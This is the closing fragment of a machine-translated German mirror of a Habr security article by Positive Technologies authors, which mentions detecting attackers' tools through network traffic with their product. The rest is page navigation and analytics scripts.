Tools von Drittanbietern, sie befinden sich bereits auf den Maschinen der Opfer und helfen, Schutz-Tools zu umgehen.  Wir konzentrieren uns auf die Untersuchung der Netzwerkkonnektivit√§t: Jedes oben beschriebene Tool hinterl√§sst seine Spuren im Netzwerkverkehr.  Eine detaillierte Studie √ºber sie erm√∂glichte es uns, unserem Produkt <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">PT Network Attack Discovery</a> beizubringen, sie zu erkennen, was letztendlich dazu beitr√§gt, die gesamte Kette von Cyber-Vorf√§llen zu untersuchen, an denen sie beteiligt sind. <br><br>  <b>Autoren</b> : <br><br><ul><li>  Anton Tyurin, Leiter Expert Services, PT Expert Security Center, Positive Technologien </li><li>  Egor Podmokov, Experte, PT Expert Security Center, Positive Technologien </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de460517/">https://habr.com/ru/post/de460517/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de460507/index.html">XEN und die Zukunft der Automobilindustrie: Wie ein Open-Source-Hypervisor zu einem Konkurrenten f√ºr kommerzielle Automobill√∂sungen wird</a></li>
<li><a href="../de460509/index.html">Wie gebietsans√§ssige Proxys im Gesch√§ftsleben helfen: Ein realer Fall der Verwendung von Infatica in Data Mining</a></li>
<li><a href="../de460511/index.html">PHP-FPM-Optimierung: Verwenden von pm static f√ºr maximale Leistung</a></li>
<li><a href="../de460513/index.html">Flutter 1.7 - Was ist neu in der Version vom 10. Juli 2019?</a></li>
<li><a href="../de460515/index.html">Wie nah sind wir wirklich am Aufkommen von Robomobilen?</a></li>
<li><a href="../de460521/index.html">Die Abenteuer der schwer fassbaren Malvari, Teil IV: DDE- und Word-Dokumentfelder</a></li>
<li><a href="../de460523/index.html">Ank√ºndigung eines Mitaps, der sich nahtlos in eine BeerPHP-Getr√§nkekappe verwandelt (in Moskau und online)</a></li>
<li><a href="../de460525/index.html">Willkommen bei DINS IT EVENING im Juli: QA und JS</a></li>
<li><a href="../de460527/index.html">Probleml√∂sung mit pwnable.kr 06 - zuf√§llig und 09 - Fehler</a></li>
<li><a href="../de460531/index.html">Neugierige Perversionen aus der IT-Welt - 5</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>